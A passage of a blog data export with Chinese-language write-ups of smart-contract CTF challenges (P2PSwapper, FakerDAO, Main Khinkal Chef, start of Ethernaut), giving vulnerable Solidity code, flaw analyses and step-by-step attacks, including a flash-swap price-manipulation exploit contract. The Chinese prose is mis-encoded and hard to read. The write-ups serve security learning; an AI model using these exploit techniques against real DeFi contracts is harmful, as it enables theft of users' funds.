\"P2PSwapper: partner not found\");\n        \n        id = ++userCount;\n        userByAddress[msg.sender] = id;\n        addressById[id] = msg.sender;\n        partnerById[id] = partnerId;\n\n        emit NewUser(msg.sender, id, partnerId);\n    &#125;\n\n    function withdrawFees(address user) public nonReentrant returns (uint fees) &#123;\n        uint userId = userByAddress[user];\n        require(partnerById[userId] == userByAddress[msg.sender], \"P2PSwapper: user is not your referral\");\n        \n        fees = partnerFees[userId].sub(distributedFees[user]);\n        require(fees > 0, \"P2PSwapper: no fees to distribute\");\n\n        distributedFees[user] = distributedFees[user].add(fees);\n        p2pweth.withdraw(fees);\n        TransferHelper.safeTransferETH(msg.sender, fees);\n\n        emit WithdrawFees(msg.sender, userId, fees);\n    &#125;\n\n    function _createDeal(\n        address bidToken,\n        uint bidPrice,\n        address askToken,\n        uint askAmount\n    ) private returns (uint dealId) &#123; \n        require(askToken != address(0), \"P2PSwapper: invalid address\");\n        require(bidPrice > 0, \"P2PSwapper: invalid bid price\");\n        require(askAmount > 0, \"P2PSwapper: invalid ask amount\");\n        dealId = ++dealCount;\n        Deal storage deal = deals[dealId];\n        deal.initiator = msg.sender;\n        deal.bidToken = bidToken;\n        deal.bidPrice = bidPrice;\n        deal.askToken = askToken;\n        deal.askAmount = askAmount;\n        \n        _dealHistory[msg.sender].push(dealId);\n        \n        emit NewDeal(bidToken, bidPrice, askToken, askAmount, dealId);\n    &#125;\n\n    function _takeDeal(\n        uint dealId\n    ) private &#123; \n        Deal storage deal = deals[dealId];\n\n        TransferHelper.safeTransfer(deal.bidToken, msg.sender, deal.bidPrice);\n\n        deal.status = 1;\n        emit TakeDeal(dealId, msg.sender);\n    &#125;\n\n    receive() external payable &#123;\n        require(msg.sender == address(p2pweth), \"P2PSwapper: transfer not allowed\");\n    &#125;\n &#125;\n\nAnalyzeå­˜åœ¨æœªåˆå§‹åŒ–çš„é—®é¢˜\n\nåœ¨è¿›è¡Œä»»ä½•æ“ä½œä¹‹å‰ï¼Œä¸€åˆ‡uintæ•°æ®ç±»åž‹çš„åˆå§‹å€¼éƒ½æ˜¯0\næ‰€ä»¥åœ¨withdrawfeeæ—¶å€™æ¯æ¬¡æ¢ä¸€ä¸ªuserï¼ˆæœªåˆå§‹åŒ–è¿‡çš„ï¼‰ï¼ŒdistributedFees[user]&#x3D;0ã€userId&#x3D;userByAddress[user]&#x3D;0ã€partnerById[userId]&#x3D;0æ‰€ä»¥åœ¨fees &#x3D; partnerFees[userId].sub(distributedFees[user])è¯­å¥èµ‹å€¼æ—¶å€™å‡æ•°éƒ½æ˜¯0ï¼Œæ‰€ä»¥å¯ä»¥é‡å¤withdraw\nAttackæ¸…æ¥šäº†æ¼æ´žåŽŸç†ï¼ŒæŽ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œæ”»å‡»ï¼ŒåŽŸæœ¬çš„partnerFees[0]å€¼ä¸º0ï¼Œæ‰€ä»¥è¦å…ˆcreateDeal(p2pweth, 1, p2pweth, 1) {value:313338}ã€‚ï¼ˆåœ¨æ­¤ä¹‹å‰è¦å…ˆdeposit{value:1}å¹¶ä¸”approve(instance,1)ä»¥æ»¡è¶³createä¸­çš„transferfromæ“ä½œï¼‰æ­¤æ—¶P2PSwapperåˆçº¦instanceçš„ä½™é¢ balanceOf([nstance]&#x3D; 313338+1+313338 &#x3D; 626677ï¼ŒpartnerFees[0]å˜ä¸º156669ï¼ŒbalanceOf([nstance]&#x3D;626677å¹¶éž156669çš„æ•´æ•°å€ï¼ˆå•†å››ä½™ä¸€ï¼‰ï¼Œæ‰€ä»¥åªæœ‰è®©åˆçº¦ä½™é¢ä¸º156669çš„5å€å³156669*5&#x3D;783345ï¼Œå·®156,668ï¼Œæ‰€ä»¥deposit{value:156668}ï¼Œå†æŠŠåˆšåˆšdepositçš„tokenè½¬åˆ°instanceä¸­ã€‚\nå†åˆ†åˆ«ä½¿ç”¨5ä¸ªæœªåˆå§‹åŒ–è¿‡çš„è´¦æˆ·è¿›è¡Œwithdrawfeeå³å¯\nstep1ï¼šdeposit&#123;value:1&#125;\nstep2ï¼šapprove(instance,1)\nstep3ï¼šcreateDeal(p2pweth, 1, p2pweth, 1) &#123;value:313338&#125;\nstep4ï¼šdeposit&#123;value:156668&#125;\nstep5ï¼štransfer(instance,156668)\nstep6ï¼šwithdrawFees*5  æ¯æ¬¡useréƒ½æ˜¯ä¸åŒçš„ä¸”æœªåˆå§‹åŒ–è¿‡\n\n\n4.FakerDAORequest\n\n\n\n\n\n\n\n\nFakerDAO is the best lending protocol! Only at FakerDAO you can borrow a LAMBO if you provide enough collateral in LP tokens!\nYou have 5000 YIN and 5000 YANG, can you borrow 1 LAMBO?\nCodepragma solidity ^0.6.0;\n\nimport \"@openzeppelin/contracts/utils/ReentrancyGuard.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\n\ncontract FakerDAO is ERC20, ReentrancyGuard &#123;\n\n    using SafeMath for uint256;\n\n    address public immutable pair;\n\n    constructor (address _pair) public ERC20(\"Lambo\", \"LAMBO\") &#123;\n        _setupDecimals(0);\n        pair = _pair; // Uniswap YIN-YANG pair\n    &#125;\n\n    function borrow(uint256 _amount) public nonReentrant &#123;\n        uint256 _balance = Pair(pair).balanceOf(msg.sender);\n        uint256 _tokenPrice = price();\n        uint256 _depositRequired = _amount.mul(_tokenPrice);\n\n        require(_balance >= _depositRequired, \"Not enough collateral\");\n\n        // we get LP tokens\n        Pair(pair).transferFrom(msg.sender, address(this), _depositRequired);\n        // you get a LAMBO\n        _mint(msg.sender, _amount);\n    &#125;\n\n    function price() public view returns (uint256) &#123;\n        address token0 = Pair(pair).token0();\n        address token1 = Pair(pair).token1();\n        uint256 _reserve0 = IERC20(token0).balanceOf(pair);\n        uint256 _reserve1 = IERC20(token1).balanceOf(pair);\n        return (_reserve0 * _reserve1) / Pair(pair).totalSupply();\n    &#125;\n&#125;\n\nlibrary $\n&#123;\n\taddress constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n\taddress constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\n\ninterface PoolToken is IERC20\n&#123;\n&#125;\n\ninterface Pair is PoolToken\n&#123;\n\tfunction token0() external view returns (address _token0);\n\tfunction token1() external view returns (address _token1);\n\tfunction price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n\tfunction price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n\tfunction getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n\tfunction mint(address _to) external returns (uint256 _liquidity);\n\tfunction sync() external;\n&#125;\n\nAnalyzeé¦–å…ˆéœ€è¦äº†è§£uniswapv2åè®®ï¼Œå¯ä»¥å‚è€ƒUniswapV2åè®®è§£æžä»¥åŠUniswap-v2 Pairåˆçº¦åˆ†æž\næƒ³è¦èŽ·å¾—Lamboå¿…é¡»é€šè¿‡instanceä¸‹çš„borrowå‡½æ•°ï¼ŒèŽ·å¾—æµåŠ¨æ€§ä»£å¸åˆ™éœ€è¦addliquidityä»Žè€Œè§¦å‘mintå‡½æ•°èŽ·å¾—æµåŠ¨æ€§ä»£å¸\nmintæ•°é‡è®¡ç®—æ–¹æ³•å¦‚ä¸‹\nuint balance0 = IERC20(token0).balanceOf(address(this));\n        uint balance1 = IERC20(token1).balanceOf(address(this));\n        uint amount0 = balance0.sub(_reserve0);\n        uint amount1 = balance1.sub(_reserve1);\nif (_totalSupply == 0) &#123;\n    \n            liquidity = Math.sqrt(amount0.mul(amount1)).sub(MINIMUM_LIQUIDITY);\n           _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\n        &#125; else &#123;\n    \n            liquidity = Math.min(amount0.mul(_totalSupply) / _reserve0, amount1.mul(_totalSupply) / _reserve1);\n        &#125;\n\nåœ¨æ­¤å¤„amount0å’Œ_totalSupplyéƒ½æ˜¯1000000*10 **18ï¼Œå°†ä¼šæŠµæ¶ˆï¼Œæ‰€ä»¥æ·»åŠ æµåŠ¨æ€§çš„ä»£å¸æ•°é‡å°±æ˜¯æœ€ç»ˆmintçš„æµåŠ¨æ€§ä»£å¸ï¼Œé¦–å…ˆåœ¨æ”»å‡»åˆçº¦ä¸­æ·»åŠ æµåŠ¨æ€§mintç»™æ”»å‡»åˆçº¦100ä¸ªæµåŠ¨æ€§ä»£å¸ï¼Œæ­¤æ—¶IERC20(token0).balanceOf(pair)å’ŒIERC20(token1).balanceOf(pair)å’ŒPair(pair).totalSupply()éƒ½æ˜¯1000100 * 10 * *18ï¼Œè®¡ç®—çš„ä»·æ ¼ä¹Ÿå°†æ˜¯è¿™ä¸ªæ•°å€¼ï¼Œæ˜¾ç„¶ä¸å¤Ÿï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨uniswapv2çš„flash loanå±žæ€§ï¼Œå…ˆå€Ÿå‡ºtoken1å’Œtoken2.\næ­¤æ—¶reserveè¿˜æ²¡æœ‰æ›´æ–°ï¼Œæœ€å¤šåªèƒ½å€Ÿå‡º999,999,999,999,999,999,999,999,å‡è®¾å¦ä¸€ä¸ªä»£å¸å€Ÿå‡ºæ•°é‡ä¸º0ï¼Œç»è¿‡è®¡ç®—priceè¿˜æ¯”ä½™é¢é«˜å‡º1*10 **18ï¼Œæ‰€ä»¥å°†å¦ä¸€ä¸ªä»£å¸å€Ÿå‡º1 \n\n\nç»è¿‡è®¡ç®—æ­¤æ—¶çš„priceæ°å¥½ä¸º100*10**18ï¼Œå³å¯æ»¡è¶³borrowæ¡ä»¶\nè°ƒç”¨borrowï¼Œå½’è¿˜flash loanï¼Œå†å°†lamboè½¬ç§»åˆ°playerä¸‹\nAttacklibrary $\n&#123;\n    address constant UniswapV2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f; // ropsten\n    address constant UniswapV2_ROUTER02 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D; // ropsten\n&#125;\ncontract Attack&#123;\n    address public instance;\n    address public pair;\n    address public router;\n    uint out0;\n    uint out1;\n    constructor(address _instance,address _pair,address _router) public&#123;\n        instance=_instance;\n        pair=_pair;\n        router=_router;\n        out0=1;\n        out1=999999999999999999999999;\n    &#125;\n\n    function attack() public &#123;\n        address token0 = Pair(pair).token0();\n        address token1 = Pair(pair).token1();\n        IERC20(token0).approve(router, uint256(-1));\n        IERC20(token1).approve(router, uint256(-1));\n        IERC20(pair).approve(instance, uint256(-1));\n        IUniswapV2Router(router).addLiquidity(token0,token1,100 * 10 ** 18,100 * 10 ** 18,1, 1, address(this), uint256(-1));\n        Pair(pair).swap(out0, out1, address(this), bytes('flash loan'));\n    &#125;\n    function uniswapV2Call(address _sender, uint _amount0, uint _amount1, bytes calldata _data) external  &#123;\n        address token0 = Pair(msg.sender).token0();\n        address token1 = Pair(msg.sender).token1();\n        FakerDAO(instance).borrow(1);\n        IERC20(token0).transfer(msg.sender, IERC20(token0).balanceOf(address(this)));\n        IERC20(token1).transfer(msg.sender, IERC20(token1).balanceOf(address(this)));\n    &#125;\n    function toPlayer() public &#123;\n        FakerDAO(instance).transfer(msg.sender, 1);\n    &#125;\n&#125;\ninterface IERC20&#123;\n    \n    function totalSupply() external view returns (uint256);\n    function balanceOf(address account) external view returns (uint256);\n    function transfer(address to, uint256 amount) external returns (bool);\n    function allowance(address owner, address spender) external view returns (uint256);\n    function approve(address spender, uint256 amount) external returns (bool);\n    function transferFrom(\n        address from,\n        address to,\n        uint256 amount\n    ) external returns (bool);\n    event Transfer(address indexed from, address indexed to, uint256 value);\n    event Approval(address indexed owner, address indexed spender, uint256 value);\n&#125;\n\ninterface FakerDAO is IERC20&#123;\n    function borrow(uint256 _amount) external;\n&#125;\ninterface Pair is IERC20\n&#123;\n    function token0() external view returns (address _token0);\n    function token1() external view returns (address _token1);\n    function price0CumulativeLast() external view returns (uint256 _price0CumulativeLast);\n    function price1CumulativeLast() external view returns (uint256 _price1CumulativeLast);\n    function getReserves() external view returns (uint112 _reserve0, uint112 _reserve1, uint32 _blockTimestampLast);\n    function mint(address _to) external returns (uint256 _liquidity);\n    function sync() external;\n    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;\n&#125;\n\ninterface IUniswapV2Router &#123;\n    function WETH() external pure returns (address _token);\n    function addLiquidity(address _tokenA, address _tokenB, uint256 _amountADesired, uint256 _amountBDesired, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB, uint256 _liquidity);\n    function removeLiquidity(address _tokenA, address _tokenB, uint256 _liquidity, uint256 _amountAMin, uint256 _amountBMin, address _to, uint256 _deadline) external returns (uint256 _amountA, uint256 _amountB);\n    function swapExactTokensForTokens(uint256 _amountIn, uint256 _amountOutMin, address[] calldata _path, address _to, uint256 _deadline) external returns (uint256[] memory _amounts);\n    function swapETHForExactTokens(uint256 _amountOut, address[] calldata _path, address _to, uint256 _deadline) external payable returns (uint256[] memory _amounts);\n    function getAmountOut(uint256 _amountIn, uint256 _reserveIn, uint256 _reserveOut) external pure returns (uint256 _amountOut);\n&#125;\n\nstep1ï¼šèŽ·å¾—token0å’Œtoken1åœ°å€\nstep2ï¼šéƒ¨ç½²æ”»å‡»åˆçº¦\nstep3ï¼šIERC20(token0).transfer(Attack,5000*10**18)\nstep4ï¼šIERC20(token1).transfer(Attack,5000*10**18)\nstep5ï¼šattack\nstep6ï¼štoPlayer\n\n\n\n5.Main Khinkal Chefrequest\n\n\n\n\n\n\n\n\nMainChef is against slavery! Move from MasterChef to MainChef and move from SUSHIs to KHINKALs!\nPlease check if you can drain the funds from our main contract.\nYou have to drain all the KHINKAL tokens from the MainChefâ€™s balance.\nCodepragma solidity 0.6.12;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/SafeERC20.sol\";\nimport \"@openzeppelin/contracts/utils/EnumerableSet.sol\";\nimport \"@openzeppelin/contracts/math/SafeMath.sol\";\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\n\ncontract LPToken is ERC20(\"LP Token\", \"LPT\"), Ownable &#123;\n    constructor() public &#123;\n        _mint(msg.sender, 10e18);\n    &#125;\n\n    function mint(address account, uint value) public onlyOwner &#123;\n        _mint(account, value);\n    &#125;\n\n&#125;\ncontract KhinkalToken is ERC20(\"KhinkalToken\", \"KHINKAL\"), Ownable &#123;\n    function mint(address _to, uint256 _amount) public onlyOwner &#123;\n        _mint(_to, _amount);\n        _moveDelegates(address(0), _delegates[_to], _amount);\n    mapping (address => address) internal _delegates;\n    struct Checkpoint &#123;\n        uint32 fromBlock;\n        uint256 votes;\n    &#125;\n    mapping (address => mapping (uint32 => Checkpoint)) public checkpoints;\n    mapping (address => uint32) public numCheckpoints;\n    bytes32 public constant DOMAIN_TYPEHASH = keccak256(\"EIP712Domain(string name,uint256 chainId,address verifyingContract)\");\n    bytes32 public constant DELEGATION_TYPEHASH = keccak256(\"Delegation(address delegatee,uint256 nonce,uint256 expiry)\");\n    mapping (address => uint) public nonces;\n    event DelegateChanged(address indexed delegator, address indexed fromDelegate, address indexed toDelegate);\n    event DelegateVotesChanged(address indexed delegate, uint previousBalance, uint newBalance);\n    function delegates(address delegator)external view returns (address)&#123;\n        return _delegates[delegator];\n    &#125;\n    function delegate(address delegatee) external &#123;\n        return _delegate(msg.sender, delegatee);\n    &#125;\n    function delegateBySig(\n        address delegatee,\n        uint nonce,\n        uint expiry,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    )\n        external\n    &#123;\n        bytes32 domainSeparator = keccak256(\n            abi.encode(\n                DOMAIN_TYPEHASH,\n                keccak256(bytes(name())),\n                getChainId(),\n                address(this)\n            )\n        );\n\n        bytes32 structHash = keccak256(\n            abi.encode(\n                DELEGATION_TYPEHASH,\n                delegatee,\n                nonce,\n                expiry\n            )\n        );\n\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                domainSeparator,\n                structHash\n            )\n        );\n\n        address signatory = ecrecover(digest, v, r, s);\n        require(signatory != address(0), \"KHINKAL::delegateBySig: invalid signature\");\n        require(nonce == nonces[signatory]++, \"KHINKAL::delegateBySig: invalid nonce\");\n        require(now &lt;= expiry, \"KHINKAL::delegateBySig: signature expired\");\n        return _delegate(signatory, delegatee);\n    &#125;\n    function getCurrentVotes(address account)external view returns (uint256)&#123;\n        uint32 nCheckpoints = numCheckpoints[account];\n        return nCheckpoints > 0 ? checkpoints[account][nCheckpoints - 1].votes : 0;\n    &#125;\n    function getPriorVotes(address account, uint blockNumber)external view returns (uint256)\n    &#123;\n        require(blockNumber &lt; block.number, \"KHINKAL::getPriorVotes: not yet determined\");\n        uint32 nCheckpoints = numCheckpoints[account];\n        if (nCheckpoints == 0) &#123;\n            return 0;\n        &#125;\n        if (checkpoints[account][nCheckpoints - 1].fromBlock &lt;= blockNumber) &#123;\n            return checkpoints[account][nCheckpoints - 1].votes;\n        &#125;\n        if (checkpoints[account][0].fromBlock > blockNumber) &#123;\n            return 0;\n        &#125;\n        uint32 lower = 0;\n        uint32 upper = nCheckpoints - 1;\n        while (upper > lower) &#123;\n            uint32 center = upper - (upper - lower) / 2; // ceil, avoiding overflow\n            Checkpoint memory cp = checkpoints[account][center];\n            if (cp.fromBlock == blockNumber) &#123;\n                return cp.votes;\n            &#125; else if (cp.fromBlock &lt; blockNumber) &#123;\n                lower = center;\n            &#125; else &#123;\n                upper = center - 1;\n            &#125;\n        &#125;\n        return checkpoints[account][lower].votes;\n    &#125;\n\n    function _delegate(address delegator, address delegatee)internal&#123;\n        address currentDelegate = _delegates[delegator];\n        uint256 delegatorBalance = balanceOf(delegator); // balance of underlying KHINKALs (not scaled);\n        _delegates[delegator] = delegatee;\n\n        emit DelegateChanged(delegator, currentDelegate, delegatee);\n\n        _moveDelegates(currentDelegate, delegatee, delegatorBalance);\n    &#125;\n\n    function _moveDelegates(address srcRep, address dstRep, uint256 amount) internal &#123;\n        if (srcRep != dstRep &amp;&amp; amount > 0) &#123;\n            if (srcRep != address(0)) &#123;\n                // decrease old representative\n                uint32 srcRepNum = numCheckpoints[srcRep];\n                uint256 srcRepOld = srcRepNum > 0 ? checkpoints[srcRep][srcRepNum - 1].votes : 0;\n                uint256 srcRepNew = srcRepOld.sub(amount);\n                _writeCheckpoint(srcRep, srcRepNum, srcRepOld, srcRepNew);\n            &#125;\n\n            if (dstRep != address(0)) &#123;\n                // increase new representative\n                uint32 dstRepNum = numCheckpoints[dstRep];\n                uint256 dstRepOld = dstRepNum > 0 ? checkpoints[dstRep][dstRepNum - 1].votes : 0;\n                uint256 dstRepNew = dstRepOld.add(amount);\n                _writeCheckpoint(dstRep, dstRepNum, dstRepOld, dstRepNew);\n            &#125;\n        &#125;\n    &#125;\n\n    function _writeCheckpoint(address delegatee,uint32 nCheckpoints,uint256 oldVotes,uint256 newVotes)internal&#123;\n        uint32 blockNumber = safe32(block.number, \"KHINKAL::_writeCheckpoint: block number exceeds 32 bits\");\n\n        if (nCheckpoints > 0 &amp;&amp; checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) &#123;\n            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;\n        &#125; else &#123;\n            checkpoints[delegatee][nCheckpoints] = Checkpoint(blockNumber, newVotes);\n            numCheckpoints[delegatee] = nCheckpoints + 1;\n        &#125;\n\n        emit DelegateVotesChanged(delegatee, oldVotes, newVotes);\n    &#125;\n\n    function safe32(uint n, string memory errorMessage) internal pure returns (uint32) &#123;\n        require(n &lt; 2**32, errorMessage);\n        return uint32(n);\n    &#125;\n    function getChainId() internal pure returns (uint) &#123;\n        uint256 chainId;\n        assembly &#123; chainId := chainid() &#125;\n        return chainId;\n    &#125;\n&#125;\ncontract MainChef is Ownable &#123;\n    using SafeMath for uint256;\n    using SafeERC20 for IERC20;\n    // Info of each user.\n    struct UserInfo &#123;\n        uint256 amount; // How many LP tokens the user has provided.\n        uint256 rewardDebt; // Reward debt. See explanation below.\n    &#125;\n    // Info of each pool.\n    struct PoolInfo &#123;\n        IERC20 lpToken; // Address of LP token contract.\n        uint256 allocPoint; // How many allocation points assigned to this pool. KHINKALs to distribute per block.\n        uint256 lastRewardBlock; // Last block number that KHINKALs distribution occurs.\n        uint256 accKhinkalPerShare; // Accumulated KHINKALs per share, times 1e12. See below.\n        uint256 lastKhinkalReward; // Protection against incorrect tokenomics\n    &#125;\n    KhinkalToken public khinkal;\n    address public devaddr;\n    address public governance;\n    uint256 public bonusEndBlock;\n    uint256 public khinkalPerBlock;\n    uint256 public constant BONUS_MULTIPLIER = 10;\n    PoolInfo[] public poolInfo;\n    mapping(uint256 => mapping(address => UserInfo)) public userInfo;\n    uint256 public totalAllocPoint = 0;\n    uint256 public startBlock;\n    event Deposit(address indexed user, uint256 indexed pid, uint256 amount);\n    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);\n    event EmergencyWithdraw(\n        address indexed user,\n        uint256 indexed pid,\n        uint256 amount\n    );\n\n    constructor(\n        KhinkalToken _khinkal,\n        address _devaddr,\n        uint256 _khinkalPerBlock,\n        uint256 _startBlock,\n        uint256 _bonusEndBlock,\n        address _governance\n    ) public &#123;\n        khinkal = _khinkal;\n        devaddr = _devaddr;\n        khinkalPerBlock = _khinkalPerBlock;\n        bonusEndBlock = _bonusEndBlock;\n        startBlock = _startBlock;\n        governance = _governance;\n    &#125;\n\n    function poolLength() external view returns (uint256) &#123;\n        return poolInfo.length;\n    &#125;\n    function add(\n        uint256 _allocPoint,\n        IERC20 _lpToken,\n        bool _withUpdate\n    ) public onlyOwner &#123;\n        _add(_allocPoint, _lpToken, _withUpdate);\n    &#125;\n    function addToken(IERC20 _lpToken) public &#123;\n        require(msg.sender == owner() || msg.sender == governance, \"Access denied\");\n        _add(1, _lpToken, true);\n    &#125;\n\n    function _add(uint256 _allocPoint,IERC20 _lpToken,bool _withUpdate) internal &#123;\n        if (_withUpdate) &#123;\n            massUpdatePools();\n        &#125;\n        uint256 lastRewardBlock =\n            block.number > startBlock ? block.number : startBlock;\n        totalAllocPoint = totalAllocPoint.add(_allocPoint);\n        poolInfo.push(\n            PoolInfo(&#123;\n                lpToken: _lpToken,\n                allocPoint: _allocPoint,\n                lastRewardBlock: lastRewardBlock,\n                accKhinkalPerShare: 0,\n                lastKhinkalReward: 0\n            &#125;)\n        );\n    &#125;\n    function set(uint256 _pid,uint256 _allocPoint,bool _withUpdate) public onlyOwner &#123;\n        if (_withUpdate) &#123;\n            massUpdatePools();\n        &#125;\n        totalAllocPoint = totalAllocPoint.sub(poolInfo[_pid].allocPoint).add(\n            _allocPoint\n        );\n        poolInfo[_pid].allocPoint = _allocPoint;\n    &#125;\n    function getMultiplier(uint256 _from,uint256 _to)public view returns (uint256)&#123;\n        if (_to &lt;= bonusEndBlock) &#123;\n            return _to.sub(_from).mul(BONUS_MULTIPLIER);\n        &#125; else if (_from >= bonusEndBlock) &#123;\n            return _to.sub(_from);\n        &#125; else &#123;\n            return\n                bonusEndBlock.sub(_from).mul(BONUS_MULTIPLIER).add(\n                    _to.sub(bonusEndBlock)\n                );\n        &#125;\n    &#125;\n\n    // View function to see pending KHINKALs on frontend.\n    function pendingKhinkal(uint256 _pid,address _user)external view returns (uint256)&#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][_user];\n        uint256 accKhinkalPerShare = pool.accKhinkalPerShare;\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (block.number > pool.lastRewardBlock &amp;&amp; lpSupply != 0) &#123;\n            uint256 multiplier =\n                getMultiplier(pool.lastRewardBlock, block.number);\n            uint256 khinkalReward =\n                multiplier.mul(khinkalPerBlock).mul(pool.allocPoint).div(\n                    totalAllocPoint\n                );\n            accKhinkalPerShare = accKhinkalPerShare.add(\n                khinkalReward.mul(1e12).div(lpSupply)\n            );\n        &#125;\n        return user.amount.mul(accKhinkalPerShare).div(1e12).sub(user.rewardDebt);\n    &#125;\n\n    // Update reward vairables for all pools. Be careful of gas spending!\n    function massUpdatePools() public &#123;\n        uint256 length = poolInfo.length;\n        for (uint256 pid = 0; pid &lt; length; ++pid) &#123;\n            updatePool(pid);\n        &#125;\n    &#125;\n\n    // Update reward variables of the given pool to be up-to-date.\n    function updatePool(\n        uint256 _pid\n    ) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        if (block.number &lt;= pool.lastRewardBlock) &#123;\n            return;\n        &#125;\n        uint256 lpSupply = pool.lpToken.balanceOf(address(this));\n        if (lpSupply == 0) &#123;\n            pool.lastRewardBlock = block.number;\n            return;\n        &#125;\n        uint256 multiplier = getMultiplier(pool.lastRewardBlock, block.number);\n        uint256 khinkalReward =\n            multiplier.mul(khinkalPerBlock).mul(pool.allocPoint).div(\n                totalAllocPoint\n            );\n        khinkal.mint(devaddr, khinkalReward.div(10));\n        khinkal.mint(address(this), khinkalReward);\n        pool.accKhinkalPerShare = pool.accKhinkalPerShare.add(\n            khinkalReward.mul(1e12).div(lpSupply)\n        );\n        pool.lastKhinkalReward = khinkalReward;\n        pool.lastRewardBlock = block.number;\n    &#125;\n\n    // Deposit LP tokens to MainChef for KHINKAL allocation.\n    function deposit(uint256 _pid,uint256 _amount) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        if (user.amount > 0) &#123;\n            uint256 pending =\n                user.amount.mul(pool.accKhinkalPerShare).div(1e12).sub(\n                    user.rewardDebt\n                );\n            require(pending &lt;= pool.lastKhinkalReward, \"Reward bigger than minted\");\n            if(pending > 0) &#123;\n                khinkal.transfer(msg.sender, pending);\n            &#125;\n            khinkal.transfer(msg.sender, pending);\n        &#125;\n        pool.lpToken.safeTransferFrom(\n            address(msg.sender),\n            address(this),\n            _amount\n        );\n        user.amount = user.amount.add(_amount);\n        user.rewardDebt = user.amount.mul(pool.accKhinkalPerShare).div(1e12);\n        emit Deposit(msg.sender, _pid, _amount);\n    &#125;\n\n    // Withdraw LP tokens from MainChef.\n    function withdraw(uint256 _pid) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        updatePool(_pid);\n        uint256 pending =\n            user.amount.mul(pool.accKhinkalPerShare).div(1e12).sub(\n                user.rewardDebt\n            );\n        require(pending &lt;= pool.lastKhinkalReward, \"Reward bigger than minted\");\n        if(pending > 0) &#123;\n            khinkal.transfer(msg.sender, pending);\n        &#125;\n        if(user.amount > 0) &#123;\n            pool.lpToken.safeTransfer(address(msg.sender), user.amount);\n            user.amount = 0;\n            user.rewardDebt = user.amount.mul(pool.accKhinkalPerShare).div(1e12);\n        &#125;\n        emit Withdraw(msg.sender, _pid, user.amount);\n    &#125;\n\n    // Withdraw without caring about rewards. EMERGENCY ONLY.\n    function emergencyWithdraw(uint256 _pid) public &#123;\n        PoolInfo storage pool = poolInfo[_pid];\n        UserInfo storage user = userInfo[_pid][msg.sender];\n        pool.lpToken.safeTransfer(address(msg.sender), user.amount);\n        emit EmergencyWithdraw(msg.sender, _pid, user.amount);\n        user.amount = 0;\n        user.rewardDebt = 0;\n    &#125;\n\n    // Update governance address by the governance.\n    function setGovernance(address _governance) public &#123;\n        require(msg.sender == owner() || msg.sender == _governance, \"Access denied\");\n        governance = _governance;\n    &#125;\n\n    // Update dev address by the previous dev.\n    function dev(\n        address _devaddr\n    ) public &#123;\n        require(msg.sender == owner() || msg.sender == devaddr, \"Access denied\");\n        devaddr = _devaddr;\n    &#125;\n&#125;\n\nAnalyzeå‡½æ•°setGovernanceå¤„requireåˆ¤æ–­æ¡ä»¶æœ‰è¯¯ï¼Œmsg.sender &#x3D;&#x3D; _governanceï¼Œ _governanceä¸ºå¯æŽ§å‚æ•°ï¼Œæ‰€ä»¥å¯ä»¥å°†governanceè®¾ç½®ä¸ºhacker\n\n","slug":"Defi Hack","date":"2022-08-02T02:46:57.436Z","categories_index":"","tags_index":"åŒºå—é“¾","author_index":"bcYng"},{"id":"d254f0c02017b2eb8e14e9b15540cca1","title":"Ethernaut","content":"\n\n\nåœ°å€https://ethernaut.openzeppelin.com/\n1.fallback\n\n\n\n\n\n\n\n\né¢˜ç›®è¦æ±‚ï¼šèŽ·å¾—åˆçº¦æ‰€æœ‰æƒå¹¶å°†ä½™é¢å˜æˆ0\nCodepragma solidity ^0.6.0;\n\nimport '@openzeppelin/contracts/math/SafeMath.sol';\n\ncontract Fallback &#123;\n\n  using SafeMath for uint256;\n  mapping(address => uint) public contributions;\n  address payable public owner;\n\n  constructor() public &#123;\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  &#125;\n\n  modifier onlyOwner &#123;\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    &#125;\n\n  function contribute() public payable &#123;\n    require(msg.value &lt; 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) &#123;\n      owner = msg.sender;\n    &#125;\n  &#125;\n\n  function getContribution() public view returns (uint) &#123;\n    return contributions[msg.sender];\n  &#125;\n\n  function withdraw() public onlyOwner &#123;\n    owner.transfer(address(this).balance);\n  &#125;\n\n  receive() external payable &#123;\n    require(msg.value > 0 &amp;&amp; contributions[msg.sender] > 0);\n    owner = msg.sender;\n  